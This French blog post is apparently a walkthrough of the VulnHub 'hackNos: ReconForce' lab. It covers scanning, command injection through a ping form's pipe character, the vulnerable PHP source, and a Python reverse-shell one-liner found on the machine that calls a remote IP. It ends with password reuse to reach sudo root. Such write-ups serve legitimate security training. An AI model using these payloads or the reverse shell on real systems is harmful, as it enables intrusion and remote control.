---
title: "Solution du CTF hackNos: ReconForce de VulnHub"
tags: [CTF,VulnHub]
---

[hackNos: ReconForce](https://vulnhub.com/entry/hacknos-reconforce-v11,416/) est un boot2root mis en ligne en janvier 2020 sur *VulnHub*.

## Sean Reconnery

Une fois n'est pas coutume je commence par un `Nuclei` :

```console
$ nuclei -u http://192.168.56.222/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v2.9.4

                projectdiscovery.io

[INF] Current nuclei version: v2.9.4 (outdated)
[INF] Current nuclei-templates version: 9.5.0 (latest)
[INF] New templates added in latest release: 62
[INF] Templates loaded for current scan: 5958
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1059 (Reduced 1000 Requests)
[apache-detect] [http] [info] http://192.168.56.222/ [Apache/2.4.41 (Ubuntu)]
--- snip ---
[openssh-detect] [tcp] [info] 192.168.56.222:22 [SSH-2.0-OpenSSH_8.0p1 Ubuntu-6build1]
[ftp-anonymous-login] [tcp] [medium] 192.168.56.222:21
```

Ici ça tombe bien, car la VM n'écoute pas sur des ports exotiques.

Je me connecte au FTP pour voir ce qu'il a dans le ventre et un entête semble m'offrir un mot de passe :

```console
$ ftp anonymous@192.168.56.222
Connected to 192.168.56.222.
220 "Security@hackNos".
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
229 Entering Extended Passive Mode (|||10218|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        117          4096 Jan 06  2020 .
drwxr-xr-x    2 0        117          4096 Jan 06  2020 ..
226 Directory send OK.
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||54726|)
550 Permission denied.
```

Le FTP est vide et je ne peux rien déposer dessus.

Sur le site web je trouve un lien vers `/5ecure/` qui demande des identifiants.

Je réussis à passer l'authentification avec `admin` / `Security@hackNos`.

Je tome alors face à un formulaire qui sent l'exécution de commande à plein nez :

```html
<form name="ping" action="out.php" method="post">
	<p>
		<h6>Enter an IP address:<h6>
		<input type="text" name="ip" size="30">
		<input type="submit" name="Submit" value="Ping_Scan">
	</p>
</form>
```

`Wapiti` va nous aider à mettre les choses au clair :

```console
$ wapiti --auth-cred "admin%Security@hackNos" --auth-method basic -u http://192.168.56.222/5ecure/ -m exec,file -v2 --color

     __      __               .__  __  .__________
    /  \    /  \_____  ______ |__|/  |_|__\_____  \
    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
     \        /  / __ \|  |_> >  ||  | |  |/       \
      \__/\  /  (____  /   __/|__||__| |__/______  /
           \/        \/|__|                      \/
Wapiti 3.1.7 (wapiti-scanner.github.io)
[+] GET http://192.168.56.222/5ecure/ (0)
[+] POST http://192.168.56.222/5ecure/out.php (1)
        data: ip=default&Submit=Ping_Scan
[+] GET http://192.168.56.222/5ecure/out.php (1)
[*] Saving scan state, please wait...
This scan has been saved in the file /home/sirius/.wapiti/scans/192.168.56.222_folder_c61c5d48.db
[*] Wapiti found 3 URLs and forms during the scan
[*] Existing modules:
         backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, log4shell, methods, nikto, permanentxss, redirect, shellshock, sql, ssl, ssrf, takeover, timesql, wapp, wp_enum, xss, xxe

[*] Launching module exec
[+] GET http://192.168.56.222/5ecure/ (0)
[+] GET http://192.168.56.222/5ecure/out.php (1)
[+] POST http://192.168.56.222/5ecure/out.php (1)
        data: ip=default&Submit=Ping_Scan
[¨] POST http://192.168.56.222/5ecure/out.php (1)
        data: ip=%3Benv%3B&Submit=Ping_Scan
[¨] POST http://192.168.56.222/5ecure/out.php (1)
        data: ip=%7Cenv&Submit=Ping_Scan
---
Command execution in http://192.168.56.222/5ecure/out.php via injection in the parameter ip
Evil request:
    POST /5ecure/out.php HTTP/1.1
    host: 192.168.56.222
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.56.222/5ecure/
    content-length: 26
    authorization: Basic YWRtaW46U2VjdXJpdHlAaGFja05vcw==
    Content-Type: application/x-www-form-urlencoded

    ip=%7Cenv&Submit=Ping_Scan
---
```

Donc l'injection de commandes est possible, mais via les pipes uniquement.

Je peux faire afficher le code du script `out.php` pour en savoir plus :

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
```

Le code retire différents caractères qu'il juge dangereux. Le retrait des tirets rend impossible de passer des options à la plupart des commandes.

Pour connaître l'architecture du système je peux utiliser la commande `arch`  qui m'indique `x86_64`. Je peux alors rapatrier un `reverse-ssh` pour cette architecture et le mettre en écoute.

## Repassword

Une fois sur le système je trouve un flag dans le dossier de l'utilisateur `recon`.

```console
www-data@hacknos:/$ cat /home/recon/user.txt 
###########################################

MD5HASH: bae11ce4f67af91fa58576c1da2aad4b
```

Et aussi un script qui lui appartient dans `/var/opt` :

```console
www-data@hacknos:/$ find / -user recon -ls 2> /dev/null 
   405659      4 drwxr-xr-x   4 recon    docker       4096 Jan 10  2020 /home/recon
   399419      0 -rw-------   1 recon    docker          0 Jan 10  2020 /home/recon/.bash_history
   405660      4 -rw-r--r--   1 recon    docker       3771 May  5  2019 /home/recon/.bashrc
   405661      4 -rw-r--r--   1 recon    docker        220 May  5  2019 /home/recon/.bash_logout
   405718      0 -rw-r--r--   1 recon    docker          0 Jan  6  2020 /home/recon/.sudo_as_admin_successful
   407282      4 drwx------   2 recon    docker       4096 Jan  6  2020 /home/recon/.cache
   407280      4 drwx------   3 recon    docker       4096 Jan  6  2020 /home/recon/.gnupg
   405662      4 -rw-r--r--   1 recon    docker        807 May  5  2019 /home/recon/.profile
   523002      4 -rwxrwxrwx   1 recon    www-data      220 Jan 10  2020 /var/opt/python.py
www-data@hacknos:/$ cat /var/opt/python.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.104",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

Ce script est-il appelé via une crontab ? Je l'ai modifié pour qu'il se connecte à mon IP, mais je n'ai rien reçu.

Finalement j'ai testé les identifiants `recon`  / `Security@hackNos` via `su` et c'est passé.

L'utilisateur a des permissions `sudo` lui permettant de faire tout ce qu'il souhaite :

```console
recon@hacknos:/tmp$ sudo -l
[sudo] password for recon: 
Matching Defaults entries for recon on hacknos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User recon may run the following commands on hacknos:
    (ALL : ALL) ALL
recon@hacknos:/tmp$ sudo su
root@hacknos:/tmp# cd /root
root@hacknos:~# ls
root.txt  snap
root@hacknos:~# cat root.txt
     $$\          $$$$$$$\                                          
     \$$\         $$  __$$\                                         
$$$$\ \$$\        $$ |  $$ | $$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$$\  
\____| \$$\       $$$$$$$  |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ 
$$$$\  $$  |      $$  __$$< $$$$$$$$ |$$ /      $$ /  $$ |$$ |  $$ |
\____|$$  /       $$ |  $$ |$$   ____|$$ |      $$ |  $$ |$$ |  $$ |
     $$  /        $$ |  $$ |\$$$$$$$\ \$$$$$$$\ \$$$$$$  |$$ |  $$ |
     \__/         \__|  \__| \_______| \_______| \______/ \__|  \__|
                                                                    
                                                                    
                                                                    

MD5HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

WebBlog: www.hackNos.com

Twitter: @rahul_gehlaut
```
